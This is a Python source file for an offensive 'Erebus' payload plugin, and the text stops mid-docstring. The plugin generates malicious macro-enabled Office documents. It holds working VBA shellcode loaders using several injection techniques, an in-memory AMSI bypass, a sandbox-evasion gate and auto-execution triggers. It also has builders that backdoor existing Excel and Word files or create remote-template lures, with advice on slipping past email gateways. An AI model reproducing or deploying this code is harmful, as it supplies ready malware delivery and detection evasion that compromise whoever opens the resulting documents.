"""
Erebus Payload - MalDocs + OfficeDoc Plugin (unified rewrite)

Covers:
  - VBA source generation (command exec, shellcode loaders, AMSI bypass, obfuscation)
  - Document assembly for XLSM, XLAM, DOCM, PPTM, PPAM, DOTM-remote-template
  - Backdooring existing Excel / Word documents

Note: XLL generation has been moved to Erebus.Loaders/Erebus.Loader.

All document formats are assembled as pure-Python OOXML ZIP files; VBA binary
(vbaProject.bin) is built by agent_code/vba_compiler which implements MS-CFB +
MS-OVBA. No Office or LibreOffice is required in the build container.

OPSEC Notes (apply per document type):
  XLSM/XLAM: EXCEL.EXE hosts VBA; child-process spawns are highly monitored.
              Prefer shellcode-injection loaders over shell.Run() variants.
  DOCM:      WINWORD.EXE hosts VBA; same spawn-monitoring risk.
  PPTM/PPAM: POWERPNT.EXE hosts; PPAM persists in %APPDATA%\Microsoft\AddIns.
  DOTM:      No macros in delivered attachment; Word fetches DOTM via HTTP(S) on
             Document_Open. Use a redirector that serves 404 after first retrieval.
"""

import re
import shutil
import zipfile
import secrets
import sys
from io import BytesIO
from pathlib import Path
from typing import Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


# ---------------------------------------------------------------------------
# vba_compiler import helper
# ---------------------------------------------------------------------------

def _load_vba_compiler():
    """Locate and import compile_vba_project from agent_code/vba_compiler."""
    repo_root = Path(__file__).resolve().parents[2]
    if str(repo_root) not in sys.path:
        sys.path.insert(0, str(repo_root))
    from agent_code.vba_compiler import compile_vba_project
    return compile_vba_project


# ---------------------------------------------------------------------------
# OOXML namespace constants
# ---------------------------------------------------------------------------

_MS_VBA_TYPE = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"
_MS_CT_XL    = "application/vnd.ms-excel.vbaProject"
_MS_CT_WD    = "application/vnd.ms-office.vbaProject"


# ---------------------------------------------------------------------------
# OOXML document skeletons
# ---------------------------------------------------------------------------

_CT_XLSM = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml"
    ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Override PartName="/xl/styles.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>
  <Override PartName="/xl/vbaProject.bin"
    ContentType="application/vnd.ms-excel.vbaProject"/>
</Types>"""

_CT_XLAM = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml"
    ContentType="application/vnd.ms-excel.addin.macroEnabled.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Override PartName="/xl/styles.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>
  <Override PartName="/xl/vbaProject.bin"
    ContentType="application/vnd.ms-excel.vbaProject"/>
</Types>"""

_CT_DOCM = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>
  <Override PartName="/word/vbaProject.bin"
    ContentType="application/vnd.ms-office.vbaProject"/>
</Types>"""

_CT_PPTM = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Override PartName="/ppt/presentation.xml"
    ContentType="application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml"/>
  <Override PartName="/ppt/slideMasters/slideMaster1.xml"
    ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout1.xml"
    ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/vbaProject.bin"
    ContentType="application/vnd.ms-office.activeX+xml"/>
</Types>"""

_CT_DOTM = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/settings.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
</Types>"""

_ROOT_RELS_OFFICE = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="{target}"/>
</Relationships>"""

_XL_WORKBOOK = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>"""

_XL_WORKBOOK_RELS = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"
    Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
    Target="styles.xml"/>
  <Relationship Id="rId3"
    Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject"
    Target="vbaProject.bin"/>
</Relationships>"""

_XL_SHEET = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData/>
</worksheet>"""

_XL_STYLES = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <fonts count="1"><font><sz val="11"/><name val="Calibri"/></font></fonts>
  <fills count="2">
    <fill><patternFill patternType="none"/></fill>
    <fill><patternFill patternType="gray125"/></fill>
  </fills>
  <borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders>
  <cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs>
  <cellXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/></cellXfs>
</styleSheet>"""

_WORD_DOC = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p/></w:body>
</w:document>"""

_WORD_RELS = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject"
    Target="vbaProject.bin"/>
</Relationships>"""

_PPT_PRES_RELS = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster"
    Target="slideMasters/slideMaster1.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject"
    Target="vbaProject.bin"/>
</Relationships>"""

_PPT_SLIDEMASTER_RELS = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout"
    Target="../slideLayouts/slideLayout1.xml"/>
</Relationships>"""

_PPT_SLIDEMASTER = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldMaster xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
             xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
             xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <p:cSld><p:spTree>
    <p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
    <p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/>
      <a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
  </p:spTree></p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1"
            accent2="accent2" accent3="accent3" accent4="accent4"
            accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/></p:sldLayoutIdLst>
  <p:txStyles><p:titleStyle/><p:bodyStyle/><p:otherStyle/></p:txStyles>
</p:sldMaster>"""

_PPT_SLIDELAYOUT = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldLayout xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
             xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
             type="blank" preserve="1">
  <p:cSld name="Blank"><p:spTree>
    <p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
    <p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/>
      <a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
  </p:spTree></p:cSld>
</p:sldLayout>"""

_PPT_SLIDELAYOUT_RELS = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>"""


def _ppt_presentation_xml(is_addin: bool = False) -> str:
    addin = ' isAddIn="1"' if is_addin else ""
    return f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
                xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
                xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"{addin}>
  <p:sldMasterIdLst>
    <p:sldMasterId id="2147483648" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:sldSz cx="9144000" cy="6858000" type="screen4x3"/>
  <p:notesSz cx="6858000" cy="9144000"/>
</p:presentation>"""


# ---------------------------------------------------------------------------
# OOXML document builders
# ---------------------------------------------------------------------------

def _inject_vba_into_ooxml(
    source_zip_bytes: bytes,
    vba_bin: bytes,
    vba_path: str,
) -> bytes:
    """
    Return *source_zip_bytes* with *vba_bin* written at *vba_path* inside the archive.
    Also patches [Content_Types].xml and workbook/document rels to reference the
    vbaProject.bin if those entries are missing.
    """
    buf = BytesIO()
    with zipfile.ZipFile(BytesIO(source_zip_bytes), 'r') as zin, \
         zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            if item.filename == vba_path:
                continue  # replaced below
            data = zin.read(item.filename)
            zout.writestr(item, data)
        zout.writestr(vba_path, vba_bin)
    return buf.getvalue()


def _build_xlsm_bytes(vba_bin: bytes, is_addin: bool = False) -> bytes:
    """Assemble a minimal XLSM (or XLAM) archive with working VBA."""
    ct = _CT_XLAM if is_addin else _CT_XLSM
    buf = BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", ct)
        zf.writestr("_rels/.rels", _ROOT_RELS_OFFICE.format(target="xl/workbook.xml"))
        zf.writestr("xl/workbook.xml", _XL_WORKBOOK)
        zf.writestr("xl/_rels/workbook.xml.rels", _XL_WORKBOOK_RELS)
        zf.writestr("xl/worksheets/sheet1.xml", _XL_SHEET)
        zf.writestr("xl/styles.xml", _XL_STYLES)
        zf.writestr("xl/vbaProject.bin", vba_bin)
    return buf.getvalue()


def _build_docm_bytes(vba_bin: bytes) -> bytes:
    """Assemble a minimal DOCM archive with working VBA."""
    buf = BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _CT_DOCM)
        zf.writestr("_rels/.rels", _ROOT_RELS_OFFICE.format(target="word/document.xml"))
        zf.writestr("word/document.xml", _WORD_DOC)
        zf.writestr("word/_rels/document.xml.rels", _WORD_RELS)
        zf.writestr("word/vbaProject.bin", vba_bin)
    return buf.getvalue()


def _build_pptm_bytes(vba_bin: bytes, is_addin: bool = False) -> bytes:
    """Assemble a minimal PPTM (or PPAM) archive with working VBA."""
    buf = BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _CT_PPTM)
        zf.writestr("_rels/.rels", _ROOT_RELS_OFFICE.format(target="ppt/presentation.xml"))
        zf.writestr("ppt/presentation.xml", _ppt_presentation_xml(is_addin))
        zf.writestr("ppt/_rels/presentation.xml.rels", _PPT_PRES_RELS)
        zf.writestr("ppt/slideMasters/slideMaster1.xml", _PPT_SLIDEMASTER)
        zf.writestr("ppt/_rels/slideMasters/slideMaster1.xml.rels", _PPT_SLIDEMASTER_RELS)
        zf.writestr("ppt/slideLayouts/slideLayout1.xml", _PPT_SLIDELAYOUT)
        zf.writestr("ppt/_rels/slideLayouts/slideLayout1.xml.rels", _PPT_SLIDELAYOUT_RELS)
        zf.writestr("ppt/vbaProject.bin", vba_bin)
    return buf.getvalue()


def _build_dotm_injection_bytes(template_url: str, lure_text: str) -> bytes:
    """
    Assemble a clean DOCX that fetches a macro-enabled DOTM on Document_Open.
    No macros in the delivered file — survives email gateway scanning.
    Word fetches template_url via HTTP/S silently on open.
    """
    rels_ns = "http://schemas.openxmlformats.org/package/2006/relationships"
    document_xml = f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>{lure_text}</w:t></w:r></w:p>
  </w:body>
</w:document>"""
    word_rels = f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{rels_ns}">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings"
    Target="settings.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="{template_url}"
    TargetMode="External"/>
</Relationships>"""
    settings_xml = f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:attachedTemplate r:id="rId2"/>
</w:settings>"""
    buf = BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _CT_DOTM)
        zf.writestr("_rels/.rels", _ROOT_RELS_OFFICE.format(target="word/document.xml"))
        zf.writestr("word/document.xml", document_xml)
        zf.writestr("word/_rels/document.xml.rels", word_rels)
        zf.writestr("word/settings.xml", settings_xml)
    return buf.getvalue()


def _backdoor_existing_ooxml(
    source_path: Path,
    vba_bin: bytes,
    vba_zip_path: str,          # e.g. "xl/vbaProject.bin"
    rels_zip_path: str,          # e.g. "xl/_rels/workbook.xml.rels"
    content_types_override: str, # e.g. "/xl/vbaProject.bin"
    content_type_value: str,     # e.g. _MS_CT_XL
    output_path: Path,
) -> Path:
    """
    Patch an existing Office document (any OOXML zip) with *vba_bin*.
    Updates [Content_Types].xml and the workbook/document rels to reference
    vbaProject.bin if the entries are missing.
    """
    import xml.etree.ElementTree as ET

    src_data = source_path.read_bytes()
    tmp = BytesIO()

    with zipfile.ZipFile(BytesIO(src_data), 'r') as zin, \
         zipfile.ZipFile(tmp, 'w', zipfile.ZIP_DEFLATED) as zout:

        for item in zin.infolist():
            name = item.filename
            data = zin.read(name)

            if name == "[Content_Types].xml":
                # Add vbaProject.bin override if missing
                root = ET.fromstring(data)
                ET.register_namespace("", "http://schemas.openxmlformats.org/package/2006/content-types")
                has_vba = any(
                    el.get("PartName", "").endswith("vbaProject.bin")
                    for el in root
                )
                if not has_vba:
                    ov = ET.SubElement(root, "{http://schemas.openxmlformats.org/package/2006/content-types}Override")
                    ov.set("PartName", content_types_override)
                    ov.set("ContentType", content_type_value)
                data = ET.tostring(root, encoding="unicode", xml_declaration=False)
                data = (b'<?xml version=\'1.0\' encoding=\'UTF-8\' standalone=\'yes\'?>\n'
                        + data.encode())

            elif name == rels_zip_path:
                # Add vbaProject relationship if missing
                root = ET.fromstring(data)
                ET.register_namespace("", "http://schemas.openxmlformats.org/package/2006/relationships")
                has_vba = any(
                    "vbaProject" in el.get("Target", "")
                    for el in root
                )
                if not has_vba:
                    existing_ids = [
                        int(el.get("Id", "rId0").replace("rId", ""))
                        for el in root
                        if el.get("Id", "").startswith("rId")
                    ]
                    next_id = max(existing_ids, default=0) + 1
                    rel = ET.SubElement(root, "{http://schemas.openxmlformats.org/package/2006/relationships}Relationship")
                    rel.set("Id", f"rId{next_id}")
                    rel.set("Type", _MS_VBA_TYPE)
                    rel.set("Target", "vbaProject.bin")
                data = ET.tostring(root, encoding="unicode", xml_declaration=False)
                data = (b'<?xml version=\'1.0\' encoding=\'UTF-8\' standalone=\'yes\'?>\n'
                        + data.encode())

            elif name == vba_zip_path:
                continue  # replaced below

            zout.writestr(item, data)

        zout.writestr(vba_zip_path, vba_bin)

    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(tmp.getvalue())
    return output_path


# ---------------------------------------------------------------------------
# VBA source generators
# ---------------------------------------------------------------------------

def _vba_trigger_sub(trigger_type: str, call_target: str, is_word: bool = False) -> str:
    """
    Return VBA auto-exec subs that call *call_target*.
    trigger_type: "AutoOpen" | "OnClose" | "OnSave"
    """
    if trigger_type == "OnClose":
        trigger_sub = "Auto_Close"
        event_sub = "Sub Workbook_BeforeClose(Cancel As Boolean)" if not is_word else "Sub Document_Close()"
    elif trigger_type == "OnSave":
        trigger_sub = "Auto_Save"
        event_sub = "Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)" if not is_word else "Sub Document_BeforeSave(ByVal SaveUI As Boolean, Cancel As Boolean)"
    else:
        trigger_sub = "AutoOpen"
        event_sub = "Sub Document_Open()" if is_word else ""

    lines = [f"Sub {trigger_sub}()\n    {call_target}\nEnd Sub\n"]
    if event_sub:
        lines.append(f"{event_sub}\n    {call_target}\nEnd Sub\n")
    return "\n".join(lines)


# Win32 memory protection constants used across all injection templates.
# Defined as module-level Python strings so they appear as VBA comments
# in the generated source — helps readability without polluting the VBA
# namespace.
_PAGE_READWRITE     = "&H04"   # PAGE_READWRITE
_PAGE_EXECUTE_READ  = "&H20"   # PAGE_EXECUTE_READ
_MEM_COMMIT_RESERVE = "&H3000" # MEM_COMMIT | MEM_RESERVE
_THREAD_SET_CONTEXT = "&H10"   # THREAD_SET_CONTEXT (minimum for QueueUserAPC)
_CREATE_SUSPENDED   = "&H4"    # CREATE_SUSPENDED


_VBA_API_DECLS = """\
#If VBA7 Then
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" _
    (ByVal lpAddr As LongPtr, ByVal dwSize As LongPtr, _
     ByVal flAlloc As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" _
    (ByVal lpAddr As LongPtr, ByVal dwSize As LongPtr, _
     ByVal flNew As Long, ByRef lpOld As Long) As Long
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" _
    (ByVal dst As LongPtr, ByRef src As Any, ByVal cb As LongPtr)
Private Declare PtrSafe Function CreateThread Lib "kernel32" _
    (ByVal lpTA As LongPtr, ByVal dwStack As LongPtr, _
     ByVal lpStart As LongPtr, ByVal lpParam As LongPtr, _
     ByVal dwFlags As Long, ByRef lpId As Long) As LongPtr
Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" _
    (ByVal hObj As LongPtr, ByVal dwMs As Long) As Long
Private Declare PtrSafe Function EnumSystemLocalesA Lib "kernel32" _
    (ByVal lpfn As LongPtr, ByVal dwFlags As Long) As Long
Private Declare PtrSafe Function QueueUserAPC Lib "kernel32" _
    (ByVal pfnAPC As LongPtr, ByVal hThr As LongPtr, ByVal dwData As LongPtr) As Long
Private Declare PtrSafe Function OpenThread Lib "kernel32" _
    (ByVal dwAccess As Long, ByVal bInherit As Long, ByVal dwTID As Long) As LongPtr
Private Declare PtrSafe Function GetCurrentThreadId Lib "kernel32" () As Long
Private Declare PtrSafe Function SleepEx Lib "kernel32" _
    (ByVal dwMs As Long, ByVal bAlert As Long) As Long
#Else
Private Declare Function VirtualAlloc Lib "kernel32" _
    (ByVal lpAddr As Long, ByVal dwSize As Long, _
     ByVal flAlloc As Long, ByVal flProtect As Long) As Long
Private Declare Function VirtualProtect Lib "kernel32" _
    (ByVal lpAddr As Long, ByVal dwSize As Long, _
     ByVal flNew As Long, ByRef lpOld As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" _
    (ByVal dst As Long, ByRef src As Any, ByVal cb As Long)
Private Declare Function CreateThread Lib "kernel32" _
    (ByVal lpTA As Long, ByVal dwStack As Long, _
     ByVal lpStart As Long, ByVal lpParam As Long, _
     ByVal dwFlags As Long, ByRef lpId As Long) As Long
Private Declare Function WaitForSingleObject Lib "kernel32" _
    (ByVal hObj As Long, ByVal dwMs As Long) As Long
Private Declare Function EnumSystemLocalesA Lib "kernel32" _
    (ByVal lpfn As Long, ByVal dwFlags As Long) As Long
Private Declare Function QueueUserAPC Lib "kernel32" _
    (ByVal pfnAPC As Long, ByVal hThr As Long, ByVal dwData As Long) As Long
Private Declare Function OpenThread Lib "kernel32" _
    (ByVal dwAccess As Long, ByVal bInherit As Long, ByVal dwTID As Long) As Long
Private Declare Function GetCurrentThreadId Lib "kernel32" () As Long
Private Declare Function SleepEx Lib "kernel32" _
    (ByVal dwMs As Long, ByVal bAlert As Long) As Long
#End If
"""

_VBA_AMSI_BYPASS = """\
#If VBA7 Then
Private Declare PtrSafe Function AmsiLL Lib "kernel32" Alias "LoadLibraryA" _
    (ByVal s As String) As LongPtr
Private Declare PtrSafe Function AmsiGP Lib "kernel32" Alias "GetProcAddress" _
    (ByVal h As LongPtr, ByVal s As String) As LongPtr
Private Declare PtrSafe Function AmsiVP Lib "kernel32" Alias "VirtualProtect" _
    (ByVal p As LongPtr, ByVal n As LongPtr, ByVal f As Long, ByRef o As Long) As Long
Private Declare PtrSafe Sub AmsiRM Lib "kernel32" Alias "RtlMoveMemory" _
    (ByVal d As LongPtr, ByRef s As Any, ByVal n As Long)
#Else
Private Declare Function AmsiLL Lib "kernel32" Alias "LoadLibraryA" _
    (ByVal s As String) As Long
Private Declare Function AmsiGP Lib "kernel32" Alias "GetProcAddress" _
    (ByVal h As Long, ByVal s As String) As Long
Private Declare Function AmsiVP Lib "kernel32" Alias "VirtualProtect" _
    (ByVal p As Long, ByVal n As Long, ByVal f As Long, ByRef o As Long) As Long
Private Declare Sub AmsiRM Lib "kernel32" Alias "RtlMoveMemory" _
    (ByVal d As Long, ByRef s As Any, ByVal n As Long)
#End If

Private Sub PatchAmsi()
    Dim b(5) As Byte
    Dim o As Long
    On Error Resume Next
#If VBA7 Then
    Dim h As LongPtr
    Dim p As LongPtr
#Else
    Dim h As Long
    Dim p As Long
#End If
    h = AmsiLL("am" & Chr(115) & "i.dll")
    If h = 0 Then Exit Sub
    p = AmsiGP(h, "Amsi" & "Scan" & "Buffer")
    If p = 0 Then Exit Sub
    b(0) = &HB8 : b(1) = &H57 : b(2) = &H00 : b(3) = &H07 : b(4) = &H80 : b(5) = &HC3
    AmsiVP p, 6, &H40, o
    AmsiRM p, b(0), 6
    AmsiVP p, 6, o, o
End Sub
"""

_VBA_SANDBOX_GATE = """\
Private Function SandboxCheck() As Boolean
    Dim t0 As Single, t1 As Single
    Dim i As Long
    On Error Resume Next
    t0 = Timer
    For i = 1 To 5000000
    Next i
    t1 = Timer
    SandboxCheck = (t1 - t0) > 1.0
End Function
"""




def _vba_createthread(vba_shellcode_src: str, trigger_type: str, is_word: bool = False) -> str:
    """
    VBA shellcode loader: VirtualAlloc(RW) → copy bytes → VirtualProtect(RX) → CreateThread.
    Avoids PAGE_EXECUTE_READWRITE: memory is PAGE_READWRITE during write, flipped to
    PAGE_EXECUTE_READ before the thread entry point is set.
    """
    prw = _PAGE_READWRITE
    prx = _PAGE_EXECUTE_READ
    mcr = _MEM_COMMIT_RESERVE
    return f"""{_VBA_API_DECLS}
{_VBA_AMSI_BYPASS}
{_VBA_SANDBOX_GATE}
{vba_shellcode_src}

Private Sub ExecutePayload()
    On Error Resume Next
    PatchAmsi
    If Not SandboxCheck() Then Exit Sub
    Dim szBuf As Long
    szBuf = UBound(buf) + 1
#If VBA7 Then
    Dim mem As LongPtr
    Dim hT  As LongPtr
#Else
    Dim mem As Long
    Dim hT  As Long
#End If
    Dim tid As Long
    Dim old As Long
    mem = VirtualAlloc(0, szBuf, {mcr}, {prw})
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, buf(0), szBuf
    VirtualProtect mem, szBuf, {prx}, old
    hT = CreateThread(0, 0, mem, 0, 0, tid)
    If hT <> 0 Then WaitForSingleObject hT, -1&
End Sub

{_vba_trigger_sub(trigger_type, "ExecutePayload", is_word)}"""


def _vba_enumlocales(vba_shellcode_src: str, trigger_type: str, is_word: bool = False) -> str:
    """
    VBA shellcode loader via EnumSystemLocalesA callback.
    The shellcode address is passed as the lpLocaleEnumProc function pointer;
    win32k calls it synchronously, so execution returns when the shellcode returns.
    Avoids CreateThread entirely — no new thread creation event.
    """
    prw = _PAGE_READWRITE
    prx = _PAGE_EXECUTE_READ
    mcr = _MEM_COMMIT_RESERVE
    return f"""{_VBA_API_DECLS}
{_VBA_AMSI_BYPASS}
{_VBA_SANDBOX_GATE}
{vba_shellcode_src}

Private Sub ExecutePayload()
    On Error Resume Next
    PatchAmsi
    If Not SandboxCheck() Then Exit Sub
    Dim szBuf As Long
    szBuf = UBound(buf) + 1
#If VBA7 Then
    Dim mem As LongPtr
#Else
    Dim mem As Long
#End If
    Dim old As Long
    mem = VirtualAlloc(0, szBuf, {mcr}, {prw})
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, buf(0), szBuf
    VirtualProtect mem, szBuf, {prx}, old
    EnumSystemLocalesA mem, 0
End Sub

{_vba_trigger_sub(trigger_type, "ExecutePayload", is_word)}"""


def _vba_queueapc(vba_shellcode_src: str, trigger_type: str, is_word: bool = False) -> str:
    """
    VBA shellcode loader via QueueUserAPC on the current thread (self-APC).
    SleepEx(0, True) puts the calling thread into an alertable wait for one
    scheduler tick, draining the APC queue and dispatching the shellcode.
    THREAD_SET_CONTEXT (0x0010) is the minimum access right required by
    QueueUserAPC — THREAD_ALL_ACCESS is unnecessary and noisier.
    """
    prw  = _PAGE_READWRITE
    prx  = _PAGE_EXECUTE_READ
    mcr  = _MEM_COMMIT_RESERVE
    tsc  = _THREAD_SET_CONTEXT
    return f"""{_VBA_API_DECLS}
{_VBA_AMSI_BYPASS}
{_VBA_SANDBOX_GATE}
{vba_shellcode_src}

Private Sub ExecutePayload()
    On Error Resume Next
    PatchAmsi
    If Not SandboxCheck() Then Exit Sub
    Dim szBuf As Long
    szBuf = UBound(buf) + 1
#If VBA7 Then
    Dim mem As LongPtr
    Dim hT  As LongPtr
#Else
    Dim mem As Long
    Dim hT  As Long
#End If
    Dim old As Long
    mem = VirtualAlloc(0, szBuf, {mcr}, {prw})
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, buf(0), szBuf
    VirtualProtect mem, szBuf, {prx}, old
    hT = OpenThread({tsc}, 0, GetCurrentThreadId())
    If hT = 0 Then Exit Sub
    QueueUserAPC mem, hT, 0
    SleepEx 0, 1
End Sub

{_vba_trigger_sub(trigger_type, "ExecutePayload", is_word)}"""


def _vba_process_hollow(
    vba_shellcode_src: str,
    trigger_type: str,
    target_process: str = "C:\\Windows\\System32\\notepad.exe",
    is_word: bool = False,
) -> str:
    """
    VBA shellcode loader via early-bird APC injection into a suspended child process.

    Technique (correct execution path):
      1. CreateProcessA(CREATE_SUSPENDED) → obtain hProcess + hThread
      2. VirtualAllocEx(RW) in target → WriteProcessMemory → VirtualProtectEx(RX)
      3. QueueUserAPC(shellcode, hThread) → ResumeThread
         - A freshly created thread drains its APC queue before reaching the
           PE entry point, so the shellcode runs as the first user-mode code.
         - This is the same "early bird" pattern as InjectionEarlyCascade in
           the C++ loader; it does NOT require SetThreadContext / GetThreadContext.

    STARTUPINFOA sizing:
